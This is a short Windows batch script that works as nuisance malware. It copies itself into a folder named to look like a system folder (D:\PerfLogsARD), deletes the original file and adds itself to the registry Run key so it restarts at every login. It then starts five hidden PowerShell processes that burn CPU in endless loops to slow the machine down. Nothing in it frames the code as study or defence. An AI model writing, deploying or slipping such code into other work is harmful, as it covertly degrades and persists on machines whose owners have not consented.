@echo off
setlocal EnableDelayedExpansion

:: ✅ Set permanent folder and file path
set "targetDir=D:\PerfLogsARD"
set "targetScript=%targetDir%\slowmode.bat"

:: ✅ Create folder if not exist
if not exist "%targetDir%" (
    mkdir "%targetDir%"
)

:: ✅ If not running from target folder, copy self there
if /I not "%~dp0"=="%targetDir%\" (
    copy "%~f0" "%targetScript%" >nul
    :: Run copied file in background
    start "" /min "%targetScript%"
    :: Delete original
    del "%~f0"
    exit
)

:: ✅ Add to Windows Startup (Registry-based)
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SlowModeTask >nul 2>&1
if errorlevel 1 (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v SlowModeTask /t REG_SZ /d "\"%targetScript%\"" /f >nul
)

:: ✅ Background system slowdown (mouse lag, RAM+CPU usage)
for /L %%i in (1,1,5) do (
    start "" /min powershell -WindowStyle Hidden -Command "while($true){1..100000 | ForEach-Object {$_ * $_} | Out-Null}"
)

exit